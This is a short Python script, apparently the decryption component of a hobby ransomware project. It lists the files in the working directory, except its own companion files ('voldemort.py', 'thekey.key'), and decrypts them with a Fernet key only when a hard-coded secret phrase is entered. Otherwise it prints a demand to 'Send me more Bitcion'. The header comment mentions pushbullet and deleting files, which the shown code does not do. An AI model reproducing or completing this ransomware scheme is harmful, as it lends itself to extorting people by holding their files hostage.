# encrypt the files and delete using pushbullet--> and read content 

import os
from cryptography.fernet import Fernet 
import pyfiglet
from colorama import Fore


result = pyfiglet.figlet_format("NILESH SHINDE", font = "slant" )
print(Fore.GREEN +result)

files = []
for file in os.listdir():
	if file=="voldemort.py" or file=="thekey.key" or file=="decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)
with open("thekey.key","rb") as key:
	secretkey = key.read()
secretphrase = "nilesh"
user_phrase = input("Enter the secret phrase to decrypt your files \n")
if user_phrase ==secretphrase:

	for file in files:
		with open(file,"rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)

		with open(file,"wb") as thefile:
			thefile.write(contents_decrypted)
	print("congrats , you're files are decrypted....")
	result = pyfiglet.figlet_format("congrats", font = "slant" )
	print(Fore.GREEN +result)
else:
	print("sorry , wrong phrase , Send me more Bitcion")
